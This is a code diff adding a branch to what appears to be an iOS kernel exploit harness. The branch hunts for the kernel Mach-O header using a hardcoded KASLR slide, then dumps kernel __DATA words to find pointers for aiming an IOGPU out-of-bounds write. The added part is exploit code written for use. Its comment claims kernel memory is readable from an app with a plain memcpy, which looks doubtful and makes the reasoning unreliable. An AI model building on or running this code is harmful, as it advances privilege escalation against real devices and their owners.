@@ -896,6 +896,71 @@ void nk_iogpu_group_oob_run(int trigger)
         ol("[grp] read-out probe done");
     }
 
+
+    if (trigger == 8) {
+        /* KERNEL SELF-READ: no bug needed.
+         *
+         * The renderer has no kernel mapping (probing 0xfffffff020000000
+         * killed it), but the APP process does: on iOS the kernelcache is
+         * mapped into every process at 0xfffffff000000000 + slide, and we
+         * already know the slide (g_nk.slide, from the KASLR detection).
+         *
+         * The kernelcache's Mach-O header is at file offset 0 and its
+         * unslid vmaddr is 0xfffffff007000000 (__TEXT at +0x4000), so:
+         *   base       = 0xfffffff007000000 + slide
+         *   __TEXT_EXEC = base + 0xfac000
+         *   __DATA      = base + 0x3a20000
+         * Reading __DATA with a plain memcpy gives us the kernel's globals
+         * - and the globals hold the kernel pointers (current task, root
+         * task, ...). That is a kernel read with no vulnerability at all,
+         * and it is what tells us where to aim the IOGPU OOB write.
+         */
+        ol("[grp] === KERNEL SELF-READ (app side, slide-based) ===");
+        ol("[grp] g_nk.slide=0x%llx g_nk.base=0x%llx",
+           (unsigned long long)g_nk.slide, (unsigned long long)g_nk.base);
+        uint64_t slides[4];
+        int nsl = 0;
+        if (g_nk.slide) slides[nsl++] = g_nk.slide;
+        slides[nsl++] = 0x2b584000ULL;          /* the known slide */
+        slides[nsl++] = 0;
+        uint64_t found = 0;
+        for (int i = 0; i < nsl && !found; i++) {
+            uint64_t base = 0xfffffff007000000ULL + slides[i];
+            uint32_t magic = 0;
+            if (grp_safe_read(base, &magic, 4) != 0) {
+                ol("[grp] slide=0x%llx -> unmapped", (unsigned long long)slides[i]);
+                continue;
+            }
+            ol("[grp] slide=0x%llx -> magic=0x%08x", (unsigned long long)slides[i], magic);
+            if (magic == 0xfeedfacf) { found = base; ol("[grp] *** kernel Mach-O header found, base=0x%016llx", (unsigned long long)base); }
+        }
+        if (!found) {
+            ol("[grp] no kernel mapping found with the known slides");
+            return;
+        }
+        /* dump the kernel's __DATA */
+        uint64_t data = found + 0x3a20000ULL;
+        ol("[grp] kernel __DATA at 0x%016llx", (unsigned long long)data);
+        for (uint32_t k = 0; k < 64; k++) {
+            uint64_t v = 0;
+            if (grp_safe_read(data + (uint64_t)k * 8, &v, 8) != 0) {
+                ol("[grp] kdata+0x%03x unreadable", k * 8);
+                break;
+            }
+            if (!v) continue;
+            ol("[grp] kdata+0x%03x = 0x%016llx%s", k * 8, (unsigned long long)v,
+               grp_is_kernel_va(v) ? "   <-- KERNEL VA" : "");
+        }
+        /* the kernel text: prove the mapping by reading a known string */
+        {
+            uint8_t buf[64];
+            if (grp_safe_read(found + 0xfac000ULL, buf, sizeof(buf)) == 0) {
+                ol("[grp] text_exec head: %02x %02x %02x %02x %02x %02x %02x %02x",
+                   buf[0], buf[1], buf[2], buf[3], buf[4], buf[5], buf[6], buf[7]);
+            }
+        }
+    }
+
     if (trigger == 0 || trigger == 4) {
         /* DUPLICATE ADD = THE REMOVE PATH.
          *
